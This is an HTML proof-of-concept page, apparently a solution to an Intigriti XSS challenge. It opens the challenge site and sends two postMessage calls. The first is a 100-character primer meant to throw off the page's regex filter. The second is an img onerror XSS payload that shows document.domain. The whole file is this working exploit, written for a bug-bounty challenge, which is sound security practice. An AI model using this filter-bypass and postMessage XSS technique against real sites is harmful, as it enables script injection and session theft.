<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit</title>
</head>
<body>
    <h1>Challenge Solved</h1>
    <p>Click the button below to claim the bounty.</p>
    
    <button id="exploitBtn" style="font-size:20px; padding:20px;">Click to Solve</button>

    <script>
        document.getElementById('exploitBtn').addEventListener('click', () => {
            // Open the target in a new window (Allowed because of the click)
            const win = window.open("https://challenge-1225.intigriti.io", "targetWindow");

            // Wait for it to load, then fire the exploit
            setTimeout(() => {
                const targetOrigin = "https://challenge-1225.intigriti.io";

                // Step 1: Primer (Advance the regex)
                // Use the exact logic you found: 100 chars + bad char
                const padding = "A".repeat(100); 
                const badChar = "<"; 
                win.postMessage(padding + badChar, targetOrigin);

                // Step 2: Payload (XSS)
                // The regex is now desynchronized and will miss this payload
                const payload = "<img src=x onerror=alert(document.domain)>";
                win.postMessage(payload, targetOrigin);
                
            }, 2000); // 2-3 seconds wait to ensure page load
        });
    </script>
</body>
</html>
